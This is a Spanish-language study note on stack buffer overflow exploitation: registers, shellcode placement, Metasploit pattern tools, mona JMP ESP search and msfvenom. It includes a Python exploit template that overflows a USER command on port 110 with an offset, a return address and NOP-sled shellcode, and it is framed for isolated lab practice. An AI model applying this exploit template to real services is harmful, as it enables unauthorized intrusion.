
---
Tags: #EIP #buffer #bufferoverflow #mona #inmunityDebuger #metasploit

---

# ¿Qué es?

Reservar o encontrar memoria ejecutable donde colocar y ejecutar shellcode durante un overflow.

---

# Siglas de memoria

- **EIP**: indica la siguiente dirección de memoria que el ordenador debería ejecutar.
    
- **EAX**: almacena temporalmente cualquier dirección de retorno.
    
- **EBX**: almacena datos y direcciones de memoria.
    
- **ESI**: contiene la dirección de memoria de los datos de entrada.
    
- **ESP**: se usa para referenciar el inicio de un hilo (pila).
    
- **EBP**: indica la dirección de memoria del final de un hilo.
    

---

# Dónde poner el shellcode (muy breve)

- Stack — fácil de escribir, bloqueado por NX.
    
- Heap — más espacio, útil con spray.
    
- .data/.bss — direcciones estáticas si el binario lo permite.
    
- mmap/mprotect — pedir páginas RX via ROP/syscall si NX está activo.
    

---

# Conceptos clave (palabras y qué significan)

- NOP-sled: cadena de `0x90` antes del shellcode para tolerar errores de dirección.
    
- Offset: posición exacta donde sobrescribir EIP/RIP.
    
- ASLR: aleatoriza direcciones. Necesitas info-leak o técnicas predictivas.
    
- Canary: detección de corrupción de stack. Si existe, no puedes hacer overflow directo.
    

---

# Pasos mínimos para un PoC con Metasploit pattern (secuencial, 4 pasos)

1. **Generar patrón** con Metasploit:
    
    - En shell (script):
        
        `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400 > pattern.bin`
        
    - O dentro de `msfconsole`:
        
        `msf > pattern_create -l 400`
        
2. **Enviar el patrón** como payload desde tu script o cliente para provocar crash.
    
3. **Leer EIP** tras el crash en Immunity/gdb. Copia el valor mostrado (p.ej. `0x396F4230`).
    
4. **Calcular offset** con Metasploit:
    
    - En shell:
        
        `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x396F4230`
        
    - O en `msfconsole`:
        
        `msf > pattern_offset -q 0x396F4230`
        
    
    Resultado: devuelve el offset exacto (p.ej. `offset = 260`).
    

---

# Snippets útiles (Metasploit + Python)

Generar patrón (terminal):

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 > /tmp/pattern300.bin`

Enviar patrón con Python (para crash):

`import socket with open("/tmp/pattern300.bin","rb") as f:     pat = f.read() s = socket.create_connection(("IP",110),timeout=3) _ = s.recv(1024) s.sendall(b"USER "+pat+b"\r\n") s.close()`

Calcular offset (terminal):

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41326341 # salida => [*] Exact match at offset 260`

Usar offset en exploit Python:

`import struct, socket, time IP="192.168.1.145"; PORT=110 offset = 260   # valor obtenido por pattern_offset jmp_esp = 0x625011AF shellcode = b"\x90..."   # msfvenom / pwntools, sin badchars  payload = b"A"*offset payload += struct.pack("<I", jmp_esp) payload += b"\x90"*32 payload += shellcode  s = socket.create_connection((IP,PORT), timeout=3) _ = s.recv(1024) s.sendall(b"USER " + payload + b"\r\n") s.close()`

---

# Integración con msfvenom

Generar shellcode (msfvenom) excluyendo badchars:

`msfvenom -p windows/exec CMD="calc.exe" -b "\x00\x0a\x0d" -f python`

Pegar la variable `buf` resultante en tu script Python (ver comprobaciones más abajo).

---

# Mona y búsqueda de JMP ESP (recuerda)

- Tras encontrar offset, usa `!mona jmp -r esp -m <modulo.dll>` en Immunity para localizar `JMP ESP`.
    
- Escoge una dirección en módulo estable y que no contenga badchars cuando se empaquete.
    

---

# Comprobaciones rápidas (one-liners)

- `checksec --file ./vulnerable` (ver NX, PIE, Canaries)
    
- `cat /proc/sys/kernel/randomize_va_space` (ASLR: 0 desactivado, 2 activo)
    
- `file ./vulnerable` (arch/PIE)
    

---

# Errores comunes y soluciones rápidas

- Payload contiene `\x00` -> usar `-b` en msfvenom o encoder.
    
- Offset mal calculado -> regenerar patrón más largo y repetir pattern_offset.
    
- Servicio no responde tras test -> registrar último payload que causó crash.
    

---

# Buenas prácticas de laboratorio

- Trabaja en VM/lab aislado.
    
- Compila binario sin protecciones para practicar (`-fno-stack-protector -z execstack`).
    
- Versiona payloads que causan crash.
    
- Automatiza logs.
    

---

# Checklist mínimo antes de explotar

- Offset confirmado con `pattern_create` + `pattern_offset`.
    
- Canal de inyección soporta bytes necesarios.
    
- Badchars identificados y excluidos (`mona` + `pattern` tests).
    
- NX/ASLR/canary identificados.
    
- Plan B: ROP o ret2libc si NX activo.